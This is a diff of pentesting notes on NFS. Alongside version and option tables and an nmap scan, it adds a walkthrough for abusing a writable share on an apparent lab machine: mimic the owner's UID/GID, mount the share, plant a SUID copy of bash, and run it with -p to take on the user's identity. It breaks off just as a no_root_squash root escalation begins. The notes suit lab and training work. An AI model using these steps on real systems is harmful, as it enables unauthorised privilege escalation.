@@ -1,8 +1,11 @@
+#### Versions
+
 | **Version** | **Features**                                                                                                                                                                                                                                                         |
 | ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `NFSv2`     | It is older but is supported by many systems and was initially operated entirely over UDP.                                                                                                                                                                           |
 | `NFSv3`     | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                                                                                                                                       |
 | `NFSv4`     | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol. |
+#### Options
 
 | **Option**         | **Description**                                                                                                                             |
 | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -14,9 +17,7 @@
 | `insecure`         | Ports above 1024 will be used.                                                                                                              |
 | `no_subtree_check` | This option disables the checking of subdirectory trees.                                                                                    |
 | `root_squash`      | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |
-
-
-### Scanning
+#### Scanning
 
 ````bash
 sudo nmap x.x.x.x -p111,2049 -sV -sC
@@ -69,6 +70,67 @@ cat /etc/exports
 | ---------------- | ----------------------------------------------------------------------------------------------------------------------------- |
 | `root_squash`    | Converts root access to an unprivileged user (`nfsnobody`), preventing root-owned file creation and potential security risks. |
 | `no_root_squash` | Allows root access to create files as root, which can be a security risk.                                                     |
+|                  |                                                                                                                               |
+The following example defaults to `root_squash`:
+
+```
+/opt/share *(rw,no_subtree_check)
+```
+
+### Escalate to none Root user:
+
+We may be able to escalate to a none root user if we have read/write access to the share, a shell is requited on the target system.
+
+Find the UID & GUID of the target user:
+
+```bash
+www-data@mail01:/home$ ls -ln    
+drwx------ 4 902601108 902600513 4096 Jun 18  2023 peter.turner@hybrid.vl
+```
+
+Take note of the UID & GID
+
+```bash
+UID = 902601108
+GID = 902600513
+```
+
+Create a new user on the attacking system using these settings:
+
+```bash
+sudo groupadd -g 902600513 ptgroup
+sudo useradd -u 902601108 -g 902600513 attacker
+sudo su - attacker
+```
+
+Mount the NFS share on the attacking system:
+
+```bash
+mount -t nfs 10.10.157.54:/opt/share ./nfs/ -o nolock
+cd nfs
+```
+
+Copy `/bin/bash/` to the share and set the SUID:
+
+```bash
+cp /bin/bash .
+chmod u+s ./bash
+```
+
+In the shell run `bash`
+
+```bash
+./bash -p
+bash-5.1$ id
+id
+uid=33(www-data) gid=33(www-data) euid=902601108(peter.turner@hybrid.vl) groups=33(www-data)
+bash-5.1$ whoami
+whoami
+peter.turner@hybrid.vl
+```
+
+### Escalate to Root
+
 With the `no_root_squash`, we can escalate to `root`.
 
 From the attacking system:
